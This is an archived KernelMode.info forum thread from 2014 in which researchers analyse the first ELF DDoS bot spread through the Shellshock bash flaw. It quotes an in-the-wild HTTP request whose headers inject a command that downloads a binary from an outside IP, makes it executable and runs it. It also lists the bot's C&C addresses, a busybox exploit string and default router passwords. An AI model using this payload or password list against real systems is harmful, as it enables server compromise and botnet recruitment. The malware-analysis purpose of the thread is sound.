@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-gb"><!-- Mirrored from www.kernelmode.info/forum/viewtopic.php?f=16&t=3505 , Sun, 01 Dec 2019 16:53:10 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html; charset=UTF-8"><!-- /Added by HTTrack -->
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="designer" content="SiteSplat https://themeforest.net/user/themesplat/portfolio?ref=ThemeSplat">
+<meta content="KernelMode.info" property="og:site_name">
+<!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
+
+<title>Linux/Bash0day alias Shellshock alias Bashdoor&nbsp;-&nbsp;KernelMode.info</title>
+
+	<link rel="canonical" href="https://www.kernelmode.info/forum/viewtopic6848.html?t=3505">
+
+<!-- Google free font here -->
+<link href="kmdata/css.css" rel="stylesheet">
+<link href="kmdata/css_002.css" rel="stylesheet">
+
+<!-- CSS files start here -->
+<link href="kmdata/stylesheet.css" rel="stylesheet">
+<link href="kmdata/plupload.css" rel="stylesheet">
+
+
+<link href="kmdata/minicms6846.css" rel="stylesheet" media="screen">
+
+
+<!-- Remove the conditional below to use the custom CSS without FLATBOOTS Mini CMS Extension -->
+<link href="kmdata/custom.css" rel="stylesheet">
+<!-- CSS files stop here -->
+
+
+<!-- older scripts set started here after the headjs - cannot do this with phpbb31 due to ajax stuff -->
+<script src="kmdata/head.htm"></script>
+
+</head>
+<body data-spy="scroll" data-target=".scrollspy" id="phpbb" class="section-viewtopic ltr ">
+
+<div id="wrap" class="corners container-fluid">
+  <!-- start content -->
+  <div id="content-forum">
+    <div class="padding_0_40">
+	    		<div class="social-top">
+		<div class="pull-right">
+							<a title="Delete Cookies" data-original-title="" href="https://www.kernelmode.info/forum/ucp033a.html?mode=delete_cookies" target="_blank"><i class=""></i></a>
+					</div>
+	</div>
+    	
+<!-- Header block -->
+    <header class="header"> 
+     <div class="topArea"> <!-- Logo block -->
+	  <div class="leftArea">
+		  		  <div class="logo-transition">
+			<a class="logo" href="https://www.kernelmode.info/forum/index-2.html">KernelMode.info - Archive</a>
+          </div>		 
+		 		 <p class="site-info">A forum for reverse engineering, OS internals and malware analysis&nbsp;<i class="fa fa-umbrella"></i></p>
+		<div class="clearfix"></div>
+	  </div> 
+
+
+<!-- MOBILE Navigation block -->
+<!-- Everything you want hidden at 940px or less, place within here -->
+    <nav class="hidden-lg hidden-md hidden-sm">
+	 <div id="responsive-navigation" class="collapse">
+		<ul class="flexnav list-unstyled">
+		      	      <li><a href="#"><i class="fa fa-comments"></i> Forum</a></li>
+	      			<!-- Remove ext links -->
+				<!-- Remove ext links -->
+        </ul>
+	  </div>
+    </nav> 
+<!-- MOBILE Navigation block -->             </div>
+    </header> 
+<!-- Header block -->
+
+		   <div style="border-bottom: 1px solid #CCCCCC;"></div>
+		
+	
+		
+<!-- Lower Breadcrumb block -->
+		<div class="sub-breadcrumb">
+            
+                    </div>
+<!-- Lower Breadcrumb block --> 
+	
+		
+	<div id="page-body">
+	
+	    <div class="side-segment"><h3><a href="https://www.kernelmode.info/forum/viewtopic6b75.html?f=16&amp;t=3505">Linux/Bash0day alias Shellshock alias Bashdoor</a></h3></div>
+<!-- NOTE: remove the style="display: none" when you want to have the forum description on the topic body -->
+<div style="display: none;">Forum for analysis and discussion about malware.<br></div>
+
+
+
+
+
+<div class="col-md-8">
+  <div class="pull-right">	 
+     <ul class="pagination pagination-sm hidden-xs">
+		 <li class="active"><a>43 posts</a></li>
+		 					
+		<li class="active"><a>1</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic1bb4.html?f=16&amp;t=3505&amp;start=10" role="button">2</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic4ff2-2.html?f=16&amp;t=3505&amp;start=20" role="button">3</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic019d.html?f=16&amp;t=3505&amp;start=30" role="button">4</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic4910.html?f=16&amp;t=3505&amp;start=40" role="button">5</a></li>
+			<li><a href="https://www.kernelmode.info/forum/viewtopic1bb4.html?f=16&amp;t=3505&amp;start=10" rel="next" role="button">Next</a></li>
+	
+		     </ul>
+	
+	<div class="visible-xs"> 
+     <ul class="pagination pagination-sm">
+		<li class="active"><a>43 posts</a></li>		</ul>
+	</div>
+  </div>
+</div> 
+
+</div>
+
+
+
+<div class="space10"></div>
+ <div class="space10"></div>
+
+ 
+
+  <div id="p23987" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p23987">Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopicde30.html?p=23987#p23987" title="Post">#23987</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Thu Sep 25, 2014 12:10 pm 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content23987">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content">I am not feeling well, but this is important. 
+It's the first 0day bash injected ELF malware spotted in ITW attack of 
+CVE-2014-6271.<br>
+ThIs sample was found via @Yinettesys's (credit) IDS sigs: <a href="https://gist.github.com/anonymous/929d622f3b36b00c0be1" class="postlink">https://gist.github.com/anonymous/929d622f3b36b00c0be1</a><br>
+The sample is up and alive, my analysis I posted in VT (see the comment tab): <a href="https://www.virustotal.com/en/file/73b0d95541c84965fa42c3e257bb349957b3be626dec9d55efcc6ebcba6fa489/analysis/1411634118/" class="postlink">https://www.virustotal.com/en/file/73b0 ... 411634118/</a><br>
+Announced was 6h ago here: <a href="https://twitter.com/yinettesys/status/515012126268604416" class="postlink">https://twitter.com/yinettesys/status/5 ... 6268604416</a> <br>
+And detection ratio is still ZERO..  :twisted: 
+<blockquote class="uncited">/* THIS is what I am afraid of for the ELF 
+malware...sigh.. now you know why I yell ELF a lot!! The AV scanning 
+performance for new ELF itself is ANOTHER 0day actually..*/</blockquote>
+Anyway, the malware is new, spotted and saved/designed (firstly found) 
+for a #0day , so I named it as Linux/Bash0day &lt; (if you have better 
+name..pls feel free to change..  :) )<br>
+Basically the malware is backdoors to a CNC and remotely control (bot) 
+with the busybox rooter attack. CNC info is in the analysis.<br>
+It scans for logins  + tries to exploit via SCANNER (telnet?) on IPs 
+&amp; gained shell with an "overdue" busybox skids exec_code..  :lol:  
+(often sighted in telnet flaw ref is here: <a href="https://isc.sans.edu/diary/Busybox+Honeypot+Fingerprinting+and+a+new+DVR+scanner/18055" class="postlink">https://isc.sans.edu/diary/Busybox+Hone ... nner/18055</a> ) and gain privilege of the admin/root (if possible). <br>
+The main course is : It does DDoS in TCP and UDP so does other attacks (JUNK, HOLD), with backdoor to its CNC. <br>
+So it is the "another" DDoS botnet story..<br>
+<br>
+The binary wasn't clearly stripped, yet using silly decrypter, it looks 
+like a "quicky" codings job in some parts, yet well-designed/crypted in 
+many others, I think they prepared it a bit (for this kind of occassion)
+ BEFORE 0day was publicly announced (still &lt; 24day), since the 0day 
+was found in about a week before and mostly is leaked to bad guys faster
+ than good guys. <br>
+Answering twitter comments:
+<blockquote class="uncited">Q: So, not a worm at least, though that's no consolation for public-facing systems</blockquote>
+A: That SCANNER part is aiming IPs+sent "that" BusyBox codes to exploit 
+(should be telnet..other protocol just doesnt work)..Maybe not a worm, 
+but a morons who wanna build #botnet #DDoS'er upon #0day #bash 
+<blockquote class="uncited">Q: IMO, likely attackers will plant malware in web servers as 2nd stage</blockquote>
+A: Aiming router for DDoS=2nd→Busybox sploit. WebServers=1st stage←no 
+shellshock trace in #ELF (read: The actor is aiming web server to 
+implement ELF to do the scanning of routers, PoC'ed by the busybox 
+exploit in telnet which only affected routers/embedded linux/or MAYBE 
+ANDROID too! for hack or DDoS or etc purpose which is the actor's end 
+stage, in my opinion. This is backed up by the fact that there is no 
+trace of #bash #0day CGI exploit in the binary ELF itself..I was eager 
+to see that actually.<br>
+<br>
+I think we will see many more on these will come up.. beware..<br>
+Feel free to add, comment, improve, critics, put more samples of the similars. I gotta rest, in hospital bed now, bye! :| <br>
+#MalwareMustDie!</div>
+					
+										<div class="clearfix">
+											<div class="attachbox">
+						 <h5>Attachments</h5>
+										
+				
+				
+				<div class="file">
+			<div><i class="fa fa-paperclip fa-flip-horizontal"></i> <a class="postlink" href="https://www.kernelmode.info/forum/download/file0cd1.php?id=7876">nginx.7z</a></div>
+			<small><i class="fa fa-pencil"></i> 7z/infected</small><br>			<small><i class="fa fa-download"></i> (216.74 KiB) Downloaded 172 times</small>
+		</div>
+		
+								</div>
+										</div>
+										
+																					<div class="notice text-muted">
+						 <small>Last edited by <a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a> on Thu Sep 25, 2014 2:47 pm, edited 7 times in total.</small>
+						 						 <div><small></small></div>
+						</div>
+																
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile23987">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						501
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Thu Apr 12, 2012 4:53 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p23988" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p23988">Re: Linux/Bash0day alias Shellshock</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopic730d-2.html?p=23988#p23988" title="Post">#23988</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9290.html?mode=viewprofile&amp;u=327" style="color: #595959;" class="username-coloured">K_Mikhail</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Thu Sep 25, 2014 1:13 pm 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content23988">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content"><div class="inline-attachment">			
+				
+				
+				<div class="file">
+			<div><i class="fa fa-paperclip fa-flip-horizontal"></i> <a class="postlink" href="https://www.kernelmode.info/forum/download/filee502.php?id=7877">apache.7z</a></div>
+			<small><i class="fa fa-pencil"></i> pw:infected</small><br>			<small><i class="fa fa-download"></i> (216.68 KiB) Downloaded 128 times</small>
+		</div>
+		
+		</div>From <a href="https://gist.github.com/anonymous/929d622f3b36b00c0be1" class="postlink">https://gist.github.com/anonymous/929d622f3b36b00c0be1</a> :<br>
+
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>GET./.HTTP/1.0
+.User-Agent:.Thanks-Rob
+.Cookie:().{.:;.};.wget.-O./tmp/besh.http://162.253.66.76/nginx;.chmod.777./tmp/besh;./tmp/besh;
+.Host:().{.:;.};.wget.-O./tmp/besh.http://162.253.66.76/nginx;.chmod.777./tmp/besh;./tmp/besh;
+.Referer:().{.:;.};.wget.-O./tmp/besh.http://162.253.66.76/nginx;.chmod.777./tmp/besh;./tmp/besh;
+.Accept:.*/*</code></pre></div>
+
+/apache - is also working. The only difference is IP-addresses specified in ELFs.</div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile23988">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9290.html?mode=viewprofile&amp;u=327"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9290.html?mode=viewprofile&amp;u=327" style="color: #595959;" class="username-coloured">K_Mikhail</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						41
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Tue Apr 13, 2010 4:13 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p23989" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p23989">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopicbbd0.html?p=23989#p23989" title="Post">#23989</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Thu Sep 25, 2014 3:40 pm 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content23989">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content">Thank's Mikhail! <br>
+VT: <a href="https://www.virustotal.com/en/file/2d3e0be24ef668b85ed48e81ebb50dce50612fb8dce96879f80306701bc41614/analysis/" class="postlink">https://www.virustotal.com/en/file/2d3e ... /analysis/</a>
+<blockquote><cite>K_Mikhail wrote:</cite>/apache - is also working. The only difference is IP-addresses specified in ELFs.</blockquote>
+ ;) Let's do a fast check (non=ASM) for its s***** (crooks are reading 
+this too). It's good for the future reference and for all people to know
+ this ELF type. PS: the nginx and "apache" are identical in codes.<br>
+<br>
+// ip
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>0x064E4C  108.162.197.26
+0x06513D  162.253.66.76:53 &lt;=== CNC /* is changed */</code></pre></div>
+Previously the CNC was 89.238.150.154:5, this is the snapshot of the pic
+ I took when the first time CNC connection was established:<br>
+<a href="https://www.kernelmode.info/lh5.googleusercontent.com/-3dclWPJIcS0/VCRRFmZmXfI/AAAAAAAARBA/8PmqNU4WMKk/s1983/007.png" class="postlink"><img src="kmdata/007.htm" alt="Image" class="img-responsive img-post"></a><br>
+<br>
+Anyway the CNC 162.253.66.76:53 is rejecting the request now:<br>
+<a href="https://www.kernelmode.info/lh4.googleusercontent.com/-9rvO8IbQdR4/VCRNWdqmwsI/AAAAAAAARA0/LLrRU3yrZBA/s2152/006.png" class="postlink"><img src="kmdata/006.htm" alt="Image" class="img-responsive img-post"></a><br>
+<br>
+// busybox telnet exploit:
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>0x064F40  /bin/busybox;echo -e '\147\141\171\146\147\164'</code></pre></div>
+// project used file list (for further identification):
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>apache(2802): 0x06567F  cxa_atexit.c
+apache(2819): 0x06586F  malloc.c
+apache(2825): 0x0658B4  hooks.c
+apache(2832): 0x06592A  arena.c
+apache(2934): 0x066D60  ../nptl/sysdeps/unix/sysv/linux/i386/../fork.c
+apache(3068): 0x068950  vfprintf.c
+apache(3081): 0x068F00  ../stdio-common/printf_fphex.c
+apache(3084): 0x06919C  fxprintf.c
+apache(3088): 0x069340  wfileops.c
+apache(3095): 0x0695F4  strops.c
+apache(3099): 0x0696C4  wcrtomb.c
+apache(3102): 0x069778  wcsrtombs.c
+apache(3107): 0x0697F4  mbsnrtowcs.c
+apache(3118): 0x06992D  tzfile.c
+apache(3140): 0x06AB4C  ../sysdeps/unix/sysv/linux/getcwd.c
+apache(3151): 0x06AC20  ../sysdeps/unix/sysv/linux/getsysstats.c
+apache(3304): 0x06BFC0  ../sysdeps/unix/sysv/linux/dl-origin.c
+apache(3306): 0x06BFF4  gconv.c
+apache(3310): 0x06C050  gconv_db.c
+apache(3316): 0x06C0F3  gconv_conf.c
+apache(3413): 0x06C687  gconv_builtin.c
+apache(3416): 0x06C7A0  ../iconv/skeleton.c
+apache(3418): 0x06C7CF  ../iconv/loop.c
+apache(3424): 0x06C841  gconv_simple.c
+apache(3453): 0x06CC86  gconv_trans.c
+apache(3458): 0x06CCF5  gconv_dl.c
+apache(3481): 0x06CEC0  findlocale.c
+apache(3485): 0x06CF94  loadlocale.c
+apache(3499): 0x06D960  loadarchive.c
+apache(3769): 0x07C258  iofwide.c
+apache(3771): 0x07C380  ../sysdeps/x86_64/cacheinfo.c
+apache(3781): 0x07C6B0  mbsrtowcs_l.c
+apache(3799): 0x07C872  vfscanf.c
+apache(3855): 0x07CB8C  mbrtowc.c
+apache(3156): 0x06AC79  dl-load.c
+apache(3228): 0x06B480  dl-cache.c
+apache(3232): 0x06B4C9  dl-lookup.c
+apache(3270): 0x06B924  dl-reloc.c
+apache(3283): 0x06BD41  dl-misc.c
+apache(3288): 0x06BE38  dl-tls.c
+apache(3784): 0x07C734  dl-runtime.c
+apache(3858): 0x07CBBA  dl-open.c
+apache(3873): 0x07CDB0  dl-close.c
+apache(3911): 0x07D43F  dl-deps.c
+apache(3916): 0x07D495  dl-fini.c
+apache(3927): 0x07D5B0  dl-version.c</code></pre></div>
+// TCP connect communication trace (after socket):
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>0x064EFD  syn
+0x064F01  rst
+0x064F05  fin
+0x064F09  ack
+0x064F0D  psh</code></pre></div>
+// login bruter, default password, typical router basis  :!: 
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>0x065157  root
+0x06515F  admin
+0x065166  user
+0x06516C  login
+0x065173  guest
+0x06517A  toor
+0x065180  changeme
+0x06518A  1234
+0x065190  12345
+0x065197  123456
+0x06519F  default
+0x0651A8  pass
+0x0651AE  password</code></pre></div>
+// BOT COMMANDS
+<div class="codebox"><span>Code:&nbsp;<a href="#" onclick="selectCode(this); return false;">Select all</a></span><pre><code>0x064FA2  PING reply is "PONG!"
+0x064FAD  GETLOCALIP // internal
+0x064FC2  SCANNER
+0x064FDE  HOLD
+0x065007  JUNK
+0x065030  UDP
+0x065077  TCP
+0x06509B  KILLATTK
+0x065109  BUILD %s // internal
+0x065156  SH 
+0x065117  DUP</code></pre></div></div>
+					
+										
+																					<div class="notice text-muted">
+						 <small>Last edited by <a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a> on Thu Sep 25, 2014 5:33 pm, edited 4 times in total.</small>
+						 						 <div><small></small></div>
+						</div>
+																
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile23989">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						501
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Thu Apr 12, 2012 4:53 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p23990" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p23990">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopic01ae.html?p=23990#p23990" title="Post">#23990</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Thu Sep 25, 2014 4:45 pm 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content23990">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content">Another good information: <a href="https://zerobin.net/?4126dd143e521260#/owlYOO8qcxqKMD5ggEXogpUB/CCBmjs4DClhvuG3SY=" class="postlink">https://zerobin.net/?4126dd143e521260#/ ... ClhvuG3SY=</a><br>
+Thanks  @ByteAtlas for mentioning this  ;) <br>
+Anyone has a good analysis article please feel free to DM me in @malwaremustdie</div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile23990">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						501
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Thu Apr 12, 2012 4:53 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p23991" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p23991">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopicd21e.html?p=23991#p23991" title="Post">#23991</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlistd777-2.html?mode=viewprofile&amp;u=8846" style="color: #595959;" class="username-coloured">Raize</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Thu Sep 25, 2014 7:22 pm 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content23991">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content">In case you hadn't seen it yet, there was a post about an IRC bot using it as well:<br>
+<a href="http://www.alienvault.com/open-threat-exchange/blog/attackers-exploiting-shell-shock-cve-2014-6721-in-the-wild" class="postlink">http://www.alienvault.com/open-threat-e ... n-the-wild</a><br>
+<br>
+Also, it looks like someone has git code up to just make the offending section a compile-time option:<br>
+<a href="https://github.com/akamai/bash/commit/7caac6ee41f645fc21b6e5eddc820151f6e6c43c" class="postlink">https://github.com/akamai/bash/commit/7 ... 51f6e6c43c</a></div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile23991">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlistd777-2.html?mode=viewprofile&amp;u=8846"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlistd777-2.html?mode=viewprofile&amp;u=8846" style="color: #595959;" class="username-coloured">Raize</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
+				    <div class="user-profile-output">
+						1
+					</div>
+				</div>
+								
+					
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Joined</div>
+				    <div class="user-profile-output">
+						Thu Sep 25, 2014 6:54 pm
+					</div>
+				</div>
+								
+				
+								
+																
+							    								
+				</div>
+			  </div>
+		    </div>
+    </div>
+		   </div>
+</article>
+ 
+</div>
+  <div id="p24004" class="clearfix">	
+    <article>
+  <div class="well well-sm forum-answer">
+    <div class="row">
+	    <div class="postbody col-md-9 col-sm-8 col-xs-12">
+		  <div class="clearfix">
+			<div class="pull-right">
+			<div role="toolbar" class="btn-toolbar">
+									 
+							 
+						</div>
+			</div>
+			
+			<div class="pull-left">
+		     <h3><a href="#p24004">Re: Linux/Bash0day alias Shellshock alias Bashdoor</a></h3>
+		    </div>
+		  </div>
+			
+		<div class="clearfix">
+			<div class="pull-left timepost">
+			<i class="fa fa-bookmark"></i>&nbsp;<a href="https://www.kernelmode.info/forum/viewtopicf692.html?p=24004#p24004" title="Post">#24004</a>&nbsp;<i class="fa fa-user"></i>&nbsp;by&nbsp;<strong><a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a></strong> 
+			<br><i class="fa fa-clock-o"></i>&nbsp;Mon Sep 29, 2014 2:21 am 
+			</div>
+		</div>
+		
+		<div class="space10"></div>	
+			
+            <div id="post_content24004">
+
+										
+										
+					<span class="hidden hook-bfr-message"></span>
+					<div class="content"><blockquote><cite>Raize wrote:</cite>there was a post about an IRC bot...</blockquote>
+unrelated matter..this is ELF thread （￣.￣＃）＾ψ</div>
+					
+										
+																										
+            </div>
+					</div>
+			<div class="col-md-3 col-sm-4 hidden-xs">
+			  <div class="user-profile-tab">
+				<div id="profile24004">
+				<div class="user-profile-avatar">
+								<div class="avatar-frame">
+											<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815"><img src="kmdata/9c64b2fac870b9970a34651e3db5fe06.png" alt="User avatar" height="90" width="90"></a>										</div>
+					
+						
+					 									</div>
+				 				
+
+				<div class="user-profile-row">
+					    <div class="user-profile-tag">Username</div>
+				    <div class="user-profile-output">
+						<a href="https://www.kernelmode.info/forum/memberlist9c8d.html?mode=viewprofile&amp;u=2815" style="color: #595959;" class="username-coloured">unixfreaxjp</a>					</div>
+				</div>
+				
+								
+								<div class="user-profile-row">
+					    <div class="user-profile-tag">Posts</div>
